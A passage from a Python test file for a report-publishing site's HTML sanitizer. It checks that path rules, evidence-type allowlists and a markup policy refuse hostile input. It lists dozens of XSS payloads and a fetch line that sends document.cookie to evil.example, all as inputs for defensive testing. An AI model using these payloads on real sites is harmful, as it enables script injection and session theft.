        (None, None),
    ],
)
def test_safe_href_allows_only_https_and_relative_links(value, expected):
    from livingproof_capability_report.site import pages as reports_render

    assert reports_render.safe_href(value) == expected


def test_packaged_assets_require_their_license_header(tmp_path: Path, monkeypatch):
    from livingproof_capability_report.site import pages as reports_render

    (tmp_path / "styles.css").write_text(":root {}\n", encoding="utf-8")
    monkeypatch.setattr(reports_render, "ASSETS_DIR", tmp_path)
    with pytest.raises(site_tool.SiteError, match="license header"):
        reports_render.load_styles_css()


# ---------------------------------------------------------------- Vera's PR 16 findings (Rivet)


@pytest.mark.parametrize(
    ("value", "allowed"),
    [
        # Characters main's SITE_PATH allows. Gemini's split had dropped the apostrophe.
        ("evidence/a'b.html", True),
        ("evidence/trial's-video.mp4", True),
        ("evidence/a~b!c$d&e(f)g*h+i,j;k=l@m%20n-o_p.q", True),
        ("evidence/seed-1/trials.mcap", True),
        # Characters main refuses. Gemini's split had added the colon.
        ("evidence/a:b", False),
        ("a:b", False),
        ("evidence/a b.html", False),
        ('evidence/a"b.html', False),
        ("evidence/a<b>.html", False),
        ("evidence/a\\b.html", False),
        ("", False),
        ("x" * 241, False),
    ],
)
def test_site_path_charset_matches_main(value: str, allowed: bool):
    from livingproof_capability_report.site import common as reports_common

    # Reverting the SITE_PATH fix (dropping ' or adding :) fails this table.
    assert (reports_common.SITE_PATH.fullmatch(value) is not None) is allowed
    assert (reports_common.site_path(value) == value) is allowed


@pytest.mark.parametrize(
    "value", ["a\x01b", "evidence/\x00x", "https://example.com/\x7f", "x\x1fy"]
)
def test_safe_href_refuses_control_characters_that_urlsplit_keeps(value: str):
    from livingproof_capability_report.site import pages as reports_render

    # urlsplit strips tab and newline itself. These survive it, so only safe_href's own
    # control-character check refuses them. Removing that check fails this test.
    assert reports_render.safe_href(value) is None


@pytest.mark.parametrize(
    ("value", "allowed"),
    [
        ("evidence/a'b.html", True),
        ("evidence/a~b!c$d&e(f)g*h+i,j;k=l@m%20n-o_p.q", True),
        ("%2e%2e%2f", False),
        ("%2E%2E/", False),
        ("evidence/%2e%2e/secret", False),
        ("a/./b", False),
        ("./a", False),
        ("a/.", False),
        ("evidence/%2e/b", False),
        ("evidence/a%00b", False),
        ("evidence/a%01b", False),
        ("evidence/a%1fb", False),
        ("evidence/a%7fb", False),
        # Each of these is refused only after decoding, by its own check.
        ("evidence/a%3Ab", False),
        ("evidence/a%5Cb", False),
        ("%2Fetc/passwd", False),
        ("evidence%2Factions%2Fruns", False),
        ("evidence/%61rtifact.zip", False),
        # And these only before decoding.
        ("/evidence/a", False),
        ("evidence/action/runs", True),
        ("x/actions/y", False),
        ("evidence/Artifacts.zip", False),
        ("evidence/%aartifact.zip", False),
    ],
)
def test_site_path_refuses_encoded_traversal_dot_segments_and_encoded_controls(
    value: str, allowed: bool
):
    from livingproof_capability_report.site import common as reports_common

    assert (reports_common.site_path(value) == value) is allowed


# ---------------------------------------------------------------- va#20 N1: published report HTML


REPORTER_FIXTURE = ROOT / "tests/fixtures/reporter/report-v3.15.4.html"

HOSTILE_REPORT_MARKUP = [
    "<SCRIPT>alert(1)</SCRIPT>",
    "<script src='https://evil.example/x.js'></script>",
    "<script data-report-times/>alert(1)</script>",
    "<svg onload=alert(1)></svg>",
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<IMG SRC=x OnError=alert(1)>",
    "<img srcset='https://evil.example/x.png 1x'>",
    "<img src='evidence/x.png' onerror='alert(1)'>",
    "<details open ontoggle=alert(1)><summary>x</summary></details>",
    "<a href='https://ok.example/' onclick='alert(1)'>x</a>",
    "<a href=javascript:alert(1)>x</a>",
    "<a href='&#106;avascript:alert(1)'>x</a>",
    "<a href='javascript&colon;alert(1)'>x</a>",
    "<a href='javascript&#58;alert(1)'>x</a>",
    "<a href='java&Tab;script:alert(1)'>x</a>",
    "<a href='data:text/html,<script>alert(1)</script>'>x</a>",
    "<a href='http://insecure.example/'>x</a>",
    "<a href='//evil.example/'>x</a>",
    "<a href='https://user:pass@evil.example/'>x</a>",
    "<a href='https://ok.example/' href='javascript:alert(1)'>x</a>",
    "<a/href='javascript:alert(1)'>x</a>",
    # Written so a browser and this parser could read the attributes differently.
    "<a/href='https://ok.example/'>x</a>",
    "<p title='x'class='y'>x</p>",
    "<p title=a`b>x</p>",
    "<p title=x=y>x</p>",
    "<p class='a' class='b'>x</p>",
    # Elements outside the reporter's vocabulary, even with no attributes.
    "<iframe></iframe>",
    "<object></object>",
    "<xmp><img src=x onerror=alert(1)></xmp>",
    "<plaintext>",
    "<base>",
    "<marquee>x",
    "<noscript></noscript>",
    "<math><mi>x</mi></math>",
    "<svg><style>p{color:red}</style></svg>",
    "<a href='https://ok.example/'/onclick=alert(1)>x</a>",
    "<div style='background:url(https://evil.example/x)'>x</div>",
    "<div style='background:u\\72l(https://evil.example/x)'>x</div>",
    "<div style='background:image-set(\"https://evil.example/x\" 1x)'>x</div>",
    "<style>@import 'https://evil.example/x.css';</style>",
    "<style>body{background:url(https://evil.example/x)}</style>",
    "<style>body{background:URL( 'https://evil.example/x' )}</style>",
    "<style/>body{background:url(https://evil.example/x)}</style>",
    "<svg><style><img src=x onerror=alert(1)></style></svg>",
    "<svg><p>breakout</p></svg>",
    "<p><div></div><svg></p><style><img src=x onerror=alert(1)></style></svg>",
    "<svg><a xlink:href='javascript:alert(1)'><text>x</text></a></svg>",
    "<svg><use href='https://evil.example/x.svg#a'/></svg>",
    "<svg><rect fill='url(https://evil.example/x#a)'/></svg>",
    "<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>",
    "<svg><animate attributeName='href' to='javascript:alert(1)'/></svg>",
    "<math><mi xlink:href='javascript:alert(1)'>x</mi></math>",
    "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>",
    "<iframe src='https://evil.example/'></iframe>",
    "<object data='https://evil.example/x.swf'></object>",
    "<embed src='https://evil.example/x.swf'>",
    "<base href='https://evil.example/'>",
    "<meta http-equiv='refresh' content='0;url=https://evil.example/'>",
    "<meta charset='utf-7'>",
    "<link rel='stylesheet' href='https://evil.example/x.css'>",
    "<form action='https://evil.example/'><input name='q'></form>",
    "<button formaction='javascript:alert(1)'>x</button>",
    "<input type='image' src='https://evil.example/x.png'>",
    "<video src='evidence/x.mp4' poster='javascript:alert(1)'></video>",
    "<video><source src='https://evil.example/x.mp4'></video>",
    "<noscript><p title='</noscript><img src=x onerror=alert(1)>'></p></noscript>",
    "<textarea><img src=x onerror=alert(1)></textarea>",
    "<template><img src=x onerror=alert(1)></template>",
    "<title><img src=x onerror=alert(1)></title>",
    "<!--><img src=x onerror=alert(1)>-->",
    "<!-- note -->",
    "<![CDATA[<img src=x onerror=alert(1)>]]>",
    "<?xml-stylesheet href='https://evil.example/x.xsl'?>",
    "<!DOCTYPE html SYSTEM 'https://evil.example/x.dtd'>",
    "<p>1 < 2</p>",
    "<p>x</p><img src=x onerror=alert(1)",
    "<p>a\x00b</p>",
    # va#20 round 2. Old html.parser reads <title> as ordinary markup and misses these
    # script ends, so the browser-rule scan must refuse them on every Python (B1).
    '<title><p title="</title><img src=x onerror=alert(1)>"></p></title>',
    "<script data-eval-tabs>x</script x><img src=x onerror=alert(1)></script>",
    "<script data-eval-tabs>x</script/><img src=x onerror=alert(1)></script>",
    "<script data-eval-tabs>x</script ><img src=x onerror=alert(1)></script>",
    "<script data-eval-tabs>x</script >",
    # Reached by input, each refused by one guard (B3).
    "<script data-eval-tabs>x",
    "<style>p{color:red}",
    "<svg><img src='evidence/a.png'/></svg>",
    "<p>x</p></marquee>",
    "<div style='background:url(\"data:font/woff2;base64,url(https://evil.example/x)\")'>x</div>",
]

# Cases the html.parser layer is not there for: the control-character check comes first, and
# html.parser alone accepts the rest on some Python releases, which is what the scan is for.
NOT_PARSER_MARKUP = {
    "<p>a\x00b</p>",
    '<title><p title="</title><img src=x onerror=alert(1)>"></p></title>',
    "<script data-eval-tabs>x</script x><img src=x onerror=alert(1)></script>",
    "<script data-eval-tabs>x</script/><img src=x onerror=alert(1)></script>",
}


def _page(markup: str) -> str:
    return f"<!doctype html><html lang='en'><body><main>{markup}</main></body></html>\n"


@pytest.mark.parametrize("markup", HOSTILE_REPORT_MARKUP)
def test_report_html_policy_refuses_hostile_markup(markup: str):
    from livingproof_capability_report.site import pages as reports_render

    # Each case gets past at least one rule; dropping that rule from the policy fails it.
    with pytest.raises(site_tool.SiteError):
        reports_render.checked_report_html(_page(markup), "probe")


@pytest.mark.parametrize("markup", [m for m in HOSTILE_REPORT_MARKUP if m not in NOT_PARSER_MARKUP])
def test_parser_allowlist_alone_refuses_hostile_markup(markup: str):
    from livingproof_capability_report.site import pages as reports_render

    # The html.parser layer is tested without the scan in front of it, so each of its
    # rules stays tested even where the scan refuses the same input first.
    with pytest.raises(site_tool.SiteError):
        reports_render._parsed_policy(_page(markup))


# The browser-rule scan (B1). Each case is refused by the scan on its own, on every Python.
SCAN_REFUSED_MARKUP = [
    # Vera's B1 page: a browser closes <title> early and runs the onerror.
    '<title><p title="</title><img src=x onerror=alert(1)>"></p></title>',
    "<title>a<b</title>",
    "<textarea><b>x</b></textarea>",
    "<title>x</TITLE>",
    "<title>x",
    "<title/>x</title>",
    "<script data-eval-tabs>x</script x>",
    "<script data-eval-tabs>x</script/>",
    "<script data-eval-tabs>x</script >",
    "<script data-eval-tabs>x</SCRIPT>",
    "<script data-eval-tabs>x",
    "<script data-eval-tabs/>x</script>",
    "<script data-eval-tabs><!--<script>x</script>y</script>",
    "<script data-eval-tabs>a</p>b</script>",
    "<style>p{}</style >",
    "<style>a</p>b</style>",
    "<style><!--p{}--></style>",
    # Attribute values may not hold markup, and an unquoted one may not end in "/".
    '<p title="a<b">x</p>',
    '<p title="a>b">x</p>',
    "<p title='a<b'>x</p>",
    "<img src=evidence/a.png/>",
    # Only a browser's whitespace separates attributes.
    "<p\u00a0title=x>x</p>",
    "<p title=x\u00a0class=y>x</p>",
    "<p title='x'class='y'>x</p>",
    # Every "<" begins a plain tag or the doctype.
    "< p>x</p>",
    "<p>1 < 2</p>",
    "<p>x</p ></p>",
    "<a/href='https://ok.example/'>x</a>",
    "<!-- note -->",
    "<!DOCTYPE html SYSTEM 'https://evil.example/x.dtd'>",
    "<?xml-stylesheet href='https://evil.example/x.xsl'?>",
    "<![CDATA[x]]>",
    "<p>x</p><img src=x onerror=alert(1)",
]


@pytest.mark.parametrize("markup", SCAN_REFUSED_MARKUP)
def test_browser_rule_scan_refuses_ambiguous_markup(markup: str):
    from livingproof_capability_report.site import pages as reports_render

    with pytest.raises(site_tool.SiteError):
        reports_render._scan_markup(_page(markup))
    with pytest.raises(site_tool.SiteError):
        reports_render.checked_report_html(_page(markup), "probe")


@pytest.mark.parametrize(
    "markup",
    [
        '<p title="a&gt;b" class=x>x</p>',
        "<img src=evidence/a.png alt=x>",
        "<p\ttitle=x\nclass='y'\f\rid=\"z\">x</p>",
        "<svg viewBox='0 0 1 1'><title>t</title><path d='M0 0'/></svg>",
        "<style>/* #evaluator-<id> */p{}</style>",
        "<script data-eval-tabs>if(a<b){}</script>",
        "<br/><hr />",
    ],
)
def test_browser_rule_scan_accepts_plain_markup(markup: str):
    from livingproof_capability_report.site import pages as reports_render

    reports_render._scan_markup(_page(markup))


@pytest.mark.parametrize("tail", ["<script data-eval-tabs>x", "<title>x", "<style>p{}"])
def test_browser_rule_scan_refuses_a_raw_text_element_that_never_closes(tail: str):
    from livingproof_capability_report.site import pages as reports_render

    # Nothing after it, not even another end tag.
    with pytest.raises(site_tool.SiteError, match="does not end"):
        reports_render._scan_markup("<!doctype html><p>x</p>" + tail)


def test_browser_rule_scan_accepts_the_real_reporter_page():
    from livingproof_capability_report.site import pages as reports_render

    reports_render._scan_markup(REPORTER_FIXTURE.read_text(encoding="utf-8"))


def test_real_reporter_report_passes_the_policy_byte_for_byte():
    from livingproof_capability_report.site import pages as reports_render

    text = REPORTER_FIXTURE.read_text(encoding="utf-8")
    # A real v3.15.4 page: inline fonts, both reporter scripts, SVG, video and links.
    for marker in ("<script data-eval-tabs>", "<script data-report-times>", "<svg", "<video"):
        assert marker in text
    assert reports_render.checked_report_html(text, "fixture") == text


def test_unknown_reporter_script_is_removed_with_a_warning(capsys):
    from livingproof_capability_report.site import pages as reports_render

    page = (
        "<!doctype html><html lang='en'><body><p>kept</p>"
        "<script data-report-times>fetch('https://evil.example/'+document.cookie)</script>"
        "<p>also kept</p></body></html>\n"
    )
    cleaned = reports_render.checked_report_html(page, "probe")
    assert cleaned == (
        "<!doctype html><html lang='en'><body><p>kept</p><p>also kept</p></body></html>\n"
    )
    assert "not a known reporter script" in capsys.readouterr().err


def _forged_run(runs_in: Path, html_text: str, **kwargs) -> Path:
    folder = _make_run_folder(runs_in, "hallway", run_id="909", html_override=html_text, **kwargs)
    # A forged run folder recomputes SHA256SUMS, so the checksums still match.
    (folder / "SHA256SUMS").write_text(
        "".join(
            f"{hashlib.sha256((folder / n).read_bytes()).hexdigest()}  {n}\n"
            for n in site_tool.REPORT_FILES
        ),
        encoding="utf-8",
    )
    return folder


def test_forged_run_folder_with_recomputed_sha256sums_and_hostile_report_is_refused(
    tmp_path: Path,
):
    hostile = "<!doctype html><html><body><main><svg onload=alert(1)></svg></main></body></html>\n"
    _forged_run(tmp_path / "in", hostile)
    reports_dir = tmp_path / "reports"
    with pytest.raises(site_tool.SiteError, match="onload"):
        site_tool.build(reports_dir, tmp_path / "in", repository=REPO)
    assert not list(reports_dir.rglob("runs/909/index.html"))


def test_report_html_file_is_checked_where_it_is_written(tmp_path: Path):
    folder = tmp_path / "run"
    folder.mkdir()
    hostile = "<!doctype html><html><body><img src=x onerror=alert(1)></body></html>\n"
    with pytest.raises(site_tool.SiteError, match="onerror"):
        site_tool.publish_report_files(folder, hostile)
    assert not (folder / "report.html").exists()


def test_deleting_the_artifact_word_cannot_assemble_a_fetch(tmp_path: Path):
    # The site deletes the word "artifact" after reading the page; the policy runs on the
    # page it publishes, so "uartifactrl(" turning into "url(" is still refused.
    hostile = (
        "<!doctype html><html><head><style>body{background:uartifactrl(https://evil.example/x)}"
        "</style></head><body><main><p>x</p></main></body></html>\n"
    )
    _forged_run(tmp_path / "in", hostile)
    with pytest.raises(site_tool.SiteError, match="style"):
        site_tool.build(tmp_path / "reports", tmp_path / "in", repository=REPO)


def test_real_reporter_report_is_published_unchanged(tmp_path: Path):
    text = REPORTER_FIXTURE.read_text(encoding="utf-8")
    # The page links only evidence the run folder holds; the site shows any other link as text.
    held = {
        match.removeprefix("evidence/"): b"evidence"
        for match in set(re.findall(r"evidence/[A-Za-z0-9._/-]+", text))
    }
    assert "seed-01.mp4" in held
    _make_run_folder(
        tmp_path / "in", "hallway", run_id="910", html_override=text, evidence_files=held
    )
    site_tool.build(tmp_path / "reports", tmp_path / "in", repository=REPO)
    run_dir = tmp_path / "reports/unitree-g1/stock-mujoco-hallway/runs/910"
    assert (run_dir / "report.html").read_text(encoding="utf-8") == text
    page = (run_dir / "index.html").read_text(encoding="utf-8")
    for marker in ("<script data-eval-tabs>", "<script data-report-times>", "<video"):
        assert marker in page


# Evidence a browser could run as a document on the Pages origin. GitHub Pages serves .xsd
# and .rng as application/xml, and Chrome runs the XHTML script inside (B2).
DROPPED_EVIDENCE = {
    "plot.svg": b"<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>",
    "page.htm": b"<script>alert(1)</script>",
    "doc.xhtml": b"<html xmlns='http://www.w3.org/1999/xhtml'><script>alert(1)</script></html>",
    "sub/page.html": b"<script>alert(1)</script>",
    "schema.xsd": b"<r xmlns:h='http://www.w3.org/1999/xhtml'><h:script>alert(1)</h:script></r>",
    "grammar.rng": b"<r xmlns:h='http://www.w3.org/1999/xhtml'><h:script>alert(1)</h:script></r>",
    "data.unknownext": b"<script>alert(1)</script>",
    "noext": b"<script>alert(1)</script>",
}
# What reporters emit, and the plain formats a browser only displays.
KEPT_EVIDENCE = {
    name: b"x"
    for name in (
        "trial.mcap seed-01.mp4 clip.webm clip.mov clip.mkv clip.avi frame.png frame.jpg "
        "frame.jpeg frame.gif frame.webp sub/media.json run.txt run.log notes.md table.csv"
    ).split()
}


@pytest.mark.parametrize("stored", [False, True])
def test_only_allowlisted_evidence_types_are_published(tmp_path: Path, stored: bool):
    files = {**KEPT_EVIDENCE, **DROPPED_EVIDENCE}
    folder = _make_run_folder(tmp_path / "in", "hallway", run_id="911", evidence_files=files)
    if stored:
        # run.json can name evidence files directly, which skipped the old .html filter.
        record = json.loads((folder / "run.json").read_text(encoding="utf-8"))
        record["evidence"] = [
            {"label": name, "kind": "note", "files": [{"path": f"evidence/{name}"}]}
            for name in files
        ]
        (folder / "run.json").write_text(json.dumps(record), encoding="utf-8")
    site_tool.build(tmp_path / "reports", tmp_path / "in", repository=REPO)
    evidence = tmp_path / "reports/unitree-g1/stock-mujoco-hallway/runs/911/evidence"
    published = {p.relative_to(evidence).as_posix() for p in evidence.rglob("*") if p.is_file()}
    assert set(KEPT_EVIDENCE) <= published
    assert not published & set(DROPPED_EVIDENCE)


# ---------------------------------------------------------------- va#20 N1: restored runs


def _restored_run(tmp_path: Path) -> tuple[Path, Path]:
    _make_run_folder(tmp_path / "in1", "hallway", run_id="920", created="2026-11-20T06:00:00Z")
    reports = tmp_path / "reports"
    site_tool.build(reports, tmp_path / "in1", repository=REPO)
    return reports, reports / "unitree-g1/stock-mujoco-hallway/runs/920"


def _build_next_run(tmp_path: Path, reports: Path) -> None:
    _make_run_folder(tmp_path / "in2", "hallway", run_id="921", created="2026-11-21T06:00:00Z")
    site_tool.build(reports, tmp_path / "in2", repository=REPO)


def test_a_clean_restored_run_is_rechecked_and_kept(tmp_path: Path):
    reports, run = _restored_run(tmp_path)
    # A genuine listing page, written by the site's own write_listing, next to the
    # evidence it lists.
    from livingproof_capability_report.site import pages as reports_render

    (run / "evidence/clip").mkdir(parents=True, exist_ok=True)
    files = []
    for name in ("trial-01.mp4", "trial-02.mp4"):
        (run / "evidence/clip" / name).write_bytes(b"mp4")
        files.append({"path": f"evidence/clip/{name}", "bytes": 3, "sha256": "0" * 64})
    reports_render.write_listing(
        run, {"label": "clip", "name": "clip", "preserved": True, "files": files}, "../../../../"
    )
    assert (run / "evidence/clip.html").is_file()
    before = {p: p.read_bytes() for p in run.rglob("*") if p.is_file()}
    _build_next_run(tmp_path, reports)
    assert {p: p.read_bytes() for p in run.rglob("*") if p.is_file()} == before
    assert (reports / "unitree-g1/stock-mujoco-hallway/runs/921/index.html").is_file()


@pytest.mark.parametrize("page", ["report.html", "index.html"])
@pytest.mark.parametrize(
    "injected",
    [
        "<img src=x onerror=alert(1)>",
        # An unknown script would be removed from a new page; a restored one fails the build.
        "<script data-report-times>alert(1)</script>",
    ],
)
def test_a_hostile_restored_page_fails_the_next_build(tmp_path: Path, page: str, injected: str):
    reports, run = _restored_run(tmp_path)
    path = run / page
    text = path.read_text(encoding="utf-8")
    path.write_text(text.replace("</body>", injected + "</body>", 1), encoding="utf-8")
    with pytest.raises(site_tool.SiteError, match="restored"):
        _build_next_run(tmp_path, reports)


@pytest.mark.parametrize(
    "planted",
    [
        "<!doctype html><html><body><script>alert(document.domain)</script></body></html>\n",
        "<!doctype html><html><body><img src=x onerror=alert(1)></body></html>\n",
        # An unknown script would be cut from a new page; a restored one fails the build.
        "<!doctype html><html><body><script data-report-times>alert(1)</script></body></html>\n",
    ],
)
def test_a_planted_restored_evidence_page_fails_the_next_build(tmp_path: Path, planted: str):
    # Vera's round 3 probe (B5): a top-level evidence/*.html in a restored run is a page on
    # the Pages origin, so it gets the policy check like report.html, not a pass as a listing.
    reports, run = _restored_run(tmp_path)
    (run / "evidence").mkdir(exist_ok=True)
    (run / "evidence/evil.html").write_text(planted, encoding="utf-8")
    with pytest.raises(site_tool.SiteError, match="restored .*evil.html"):
        _build_next_run(tmp_path, reports)


@pytest.mark.parametrize("name", ["schema.xsd", "sub/page.html", "plot.svg", "noext", "x.HTML"])
def test_restored_evidence_of_an_unpublished_type_fails_the_next_build(tmp_path: Path, name: str):
    reports, run = _restored_run(tmp_path)
    path = run / "evidence" / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(b"<r xmlns:h='http://www.w3.org/1999/xhtml'><h:script>1</h:script></r>")
    with pytest.raises(site_tool.SiteError, match="restored"):
        _build_next_run(tmp_path, reports)


# ---------------------------------------------------------------- va#24: API path traversal


def test_a_restored_html_page_below_the_top_of_evidence_is_never_a_listing(tmp_path: Path):
    # Listings live only at evidence/<name>.html, so a nested page fails on its type even
    # when its markup would pass the page policy.
    reports, run = _restored_run(tmp_path)
    (run / "evidence/sub").mkdir(parents=True, exist_ok=True)
    (run / "evidence/sub/page.html").write_text("<!doctype html><p>x</p>\n", encoding="utf-8")
    with pytest.raises(site_tool.SiteError, match="evidence of this type is not published"):
        _build_next_run(tmp_path, reports)


# ---------------------------------------------------------------- va#32: nesting depth and size


class _CountingStack(list):
    """An open-element stack that counts every element a whole-stack scan could visit."""

    scanned = 0

    def _scan(self) -> None:
        _CountingStack.scanned += len(self)

    def __contains__(self, item):
        self._scan()
        return super().__contains__(item)

    def __iter__(self):
        self._scan()
        return super().__iter__()

    def __reversed__(self):
        self._scan()
        return super().__reversed__()

    def index(self, *args):
        self._scan()
        return super().index(*args)

    def count(self, item):
        self._scan()
        return super().count(item)

    def remove(self, item):
        self._scan()
        return super().remove(item)


def _count_stack_scans(monkeypatch, text: str) -> int:
    from livingproof_capability_report.site import pages as reports_render

    original = reports_render._ReportHtmlPolicy.__init__

    def counting_init(self, page: str) -> None:
        original(self, page)
        self.stack = _CountingStack()

    monkeypatch.setattr(reports_render._ReportHtmlPolicy, "__init__", counting_init)
    monkeypatch.setattr(_CountingStack, "scanned", 0)
    assert reports_render.checked_report_html(text, "probe") == text
    return _CountingStack.scanned


DEEP_NESTING = 20_000


@pytest.mark.parametrize(
    "markup",
    [
        pytest.param("<p>" * DEEP_NESTING, id="unclosed-start-tags"),
        pytest.param("<p>" * DEEP_NESTING + "</span>" * DEEP_NESTING, id="end-tags-not-open"),
        pytest.param(
            "<div>" + "<p>" * DEEP_NESTING + "</div>" * DEEP_NESTING, id="mismatched-closes"
        ),
    ],
)
def test_report_html_policy_never_rescans_the_open_element_stack(monkeypatch, markup: str):
    # Deterministic, unlike a wall-clock bound: count the stack elements visited by
    # membership tests, iteration and searches. The old `"svg" in self.stack` and
    # `tag in self.stack` visit the whole stack on every tag (about N*N/2 here).
    scanned = _count_stack_scans(monkeypatch, _page(markup))
    assert scanned <= DEEP_NESTING, f"{scanned} stack elements scanned for depth {DEEP_NESTING}"


def test_report_html_policy_finishes_100k_unclosed_tags_within_the_timeout():
    from livingproof_capability_report.site import pages as reports_render

    # The issue's probe: 100,000 unclosed <p> (22 s before the fix) and as many stray end
    # tags. The stack-scan count above is the regression check; this per-test timeout is a
    # generous backstop, about 40 times what the linear policy needs on a laptop.
    page = _page("<p>" * 100_000 + "</span>" * 100_000)
    with _time_limit(20):
        assert reports_render.checked_report_html(page, "probe") == page


class _ReferenceHtmlPolicy:
    """The policy's stack handling as it was before va#32, to compare against."""

    @staticmethod
    def build():
        from livingproof_capability_report.site import pages as reports_render

        class Reference(reports_render._ReportHtmlPolicy):
            def in_svg(self) -> bool:
                return "svg" in self.stack

            def handle_endtag(self, tag: str) -> None:
                if (
                    tag not in reports_render._HTML_ELEMENTS
                    and tag not in reports_render._SVG_ELEMENTS
                ):
                    self.refuse(f"</{tag}> is not allowed")
                if tag == "script" and self.script_start is not None:
                    start = self.source_offset()
                    if self.text[start : start + 9].lower() != "</script>":
                        self.refuse("</script> is not plainly written")
                    element = self.text[self.script_start : start + 9]
                    digest = hashlib.sha256(element.encode("utf-8")).hexdigest()
                    if digest not in reports_render.KNOWN_REPORTER_SCRIPTS:
                        self.unknown_scripts.append((self.script_start, start + 9, digest))
                    self.script_start = None
                if self.in_svg():
                    if self.stack[-1] != tag:
                        self.refuse(
                            f"</{tag}> does not close the open <{self.stack[-1]}> inside <svg>"
                        )
                    self.stack.pop()
                elif tag in self.stack:
                    while self.stack.pop() != tag:
                        pass

        return Reference


def _policy_outcome(policy_class, text: str):
    policy = policy_class(text)
    try:
        policy.feed(text)
        policy.close()
    except site_tool.SiteError as exc:
        return ("refused", str(exc)), policy
    return ("accepted", list(policy.stack), policy.unknown_scripts), policy


def _assert_counters_match_stack(policy) -> None:
    stack = list.__iter__(policy.stack)
    counts = collections.Counter(stack)
    assert {tag: n for tag, n in policy.open_counts.items() if n} == dict(counts)
    assert all(n >= 0 for n in policy.open_counts.values())
    assert policy.svg_depth == counts["svg"]


# Hand-written stack edge cases: implicit and mismatched closes, void elements, foreign
# svg/math content and end tags for elements that are not open.
STACK_EDGE_MARKUP = [
    "<div><span>x</div>after</span>",
    "<p><div>x</p></div>",
    "<ul><li>a<li>b</ul><p>c",
    "<table><tr><td>a<td>b</table>",
    "<p>a<p>b</p></p></p>",
    "<br></br><hr></hr><img src=a.png></img><input></input>",
    "<br/><img src=a.png/>",
    "</span></div></svg></g></p>",
    "<svg><g><rect/></g></svg><p>x</p>",
    "<svg><g></svg>",
    "<svg><svg><g></g></svg></svg>",
    "<svg><g></g></svg></svg></g>",
    "<p><svg><text>a<tspan>b</tspan></text></svg></p>",
    "<svg><title>t</title><desc>d</desc></svg>",
    "<title>t</title><svg><title>s</title></svg>",
    "<svg></p></svg>",
    "<svg><g></p></g></svg>",
    "<math><mi>x</mi></math>",
    "<p><svg>",
    "<svg/><p>x</p>",
    "<div><svg></div></svg>",
    "<script data-eval-tabs>x</script><svg></svg>",
]

_FUZZ_TOKENS = [
    *(f"<{t}>" for t in "p div span em table tr td ul li a title svg g text tspan math".split()),
    *(f"</{t}>" for t in "p div span em table tr td ul li a title svg g text tspan math".split()),
    "<br>",
    "</br>",
    "<img src=a.png>",
    "<rect/>",
    "<g/>",
    "<svg/>",
    "<hr/>",
    "x",
    " ",
]


def _fuzz_corpus(count: int, seed: int = 32) -> list[str]:
    import random

    rng = random.Random(seed)
    return ["".join(rng.choices(_FUZZ_TOKENS, k=rng.randint(1, 40))) for _ in range(count)]


def test_linear_stack_tracking_matches_the_old_policy_on_every_case():
    from livingproof_capability_report.site import pages as reports_render

    reference = _ReferenceHtmlPolicy.build()
    pages = [REPORTER_FIXTURE.read_text(encoding="utf-8")]
    pages += [
        _page(m)
        for m in HOSTILE_REPORT_MARKUP
        + SCAN_REFUSED_MARKUP
        + STACK_EDGE_MARKUP
        + _fuzz_corpus(3000)
    ]
    outcomes = collections.Counter()
    for page in pages:
        new, policy = _policy_outcome(reports_render._ReportHtmlPolicy, page)
        old, _ = _policy_outcome(reference, page)
        assert new == old, page
        outcomes[new[0]] += 1
        # The counters must equal the stack after every case, refused ones included.
        _assert_counters_match_stack(policy)
    # The corpus exercises both outcomes, so the comparison is not vacuous.
    assert outcomes["accepted"] > 100 and outcomes["refused"] > 100


@pytest.mark.parametrize("markup", STACK_EDGE_MARKUP)
def test_stack_counters_stay_in_step_after_every_tag(markup: str):
    from livingproof_capability_report.site import pages as reports_render

    class Checked(reports_render._ReportHtmlPolicy):
        def handle_starttag(self, tag, attrs):
            super().handle_starttag(tag, attrs)
            _assert_counters_match_stack(self)

        def handle_endtag(self, tag):
            super().handle_endtag(tag)
            _assert_counters_match_stack(self)

    _policy_outcome(Checked, _page(markup))


def _page_of_bytes(size: int, filler: str) -> str:
    head = "<!doctype html><p>"
    tail = "</p>\n"
    room = size - len((head + tail).encode("utf-8"))
    unit = len(filler.encode("utf-8"))
    body = filler * (room // unit) + "a" * (room % unit)
    page = head + body + tail
    assert len(page.encode("utf-8")) == size
    return page


@pytest.mark.parametrize(
    "filler", ["a", "\u00e9", "\u20ac"], ids=["ascii", "two-byte", "three-byte"]
)
def test_report_html_size_limit_is_exact_in_utf8_bytes(monkeypatch, filler: str):
    from livingproof_capability_report.site import pages as reports_render

    limit = reports_render.MAX_REPORT_HTML_BYTES
    assert limit == 8 * 1024 * 1024
    parsed = []
    monkeypatch.setattr(reports_render, "_scan_markup", lambda text: parsed.append(len(text)))
    monkeypatch.setattr(reports_render, "_parsed_policy", lambda text: _EmptyPolicy())

    at_limit = _page_of_bytes(limit, filler)
    assert reports_render.checked_report_html(at_limit, "probe") == at_limit
    assert parsed == [len(at_limit)]

    over = _page_of_bytes(limit + 1, filler)
    with pytest.raises(
        site_tool.SiteError, match=rf"^probe: report.html exceeds the {limit}-byte limit$"
    ):
        reports_render.checked_report_html(over, "probe")
    # Refused before either parsing layer runs.
    assert parsed == [len(at_limit)]


class _EmptyPolicy:
    unknown_scripts: list = []


def test_a_page_of_exactly_the_size_limit_passes_the_real_policy():
    from livingproof_capability_report.site import pages as reports_render

    page = _page_of_bytes(reports_render.MAX_REPORT_HTML_BYTES, "a")
    assert reports_render.checked_report_html(page, "probe") == page


# ---------------------------------------------------------------- issue #31: exclude-runs


def test_exclude_runs_skips_hostile_restored_run_and_keeps_other_runs_byte_for_byte(
    tmp_path: Path, capsys
):
    _make_run_folder(tmp_path / "in1/r1", "hallway", run_id="919", created="2026-11-19T06:00:00Z")
    _make_run_folder(tmp_path / "in1/r2", "hallway", run_id="920", created="2026-11-20T06:00:00Z")
    reports = tmp_path / "reports"
    site_tool.build(reports, tmp_path / "in1", repository=REPO)

    kept_run = reports / "unitree-g1/stock-mujoco-hallway/runs/919"
    hostile_run = reports / "unitree-g1/stock-mujoco-hallway/runs/920"
    kept_before = {p: p.read_bytes() for p in kept_run.rglob("*") if p.is_file()}

    report_html = hostile_run / "report.html"
    report_html.write_text(
        report_html.read_text(encoding="utf-8").replace(
            "</body>", "<script data-report-times>alert(1)</script></body>", 1
        ),
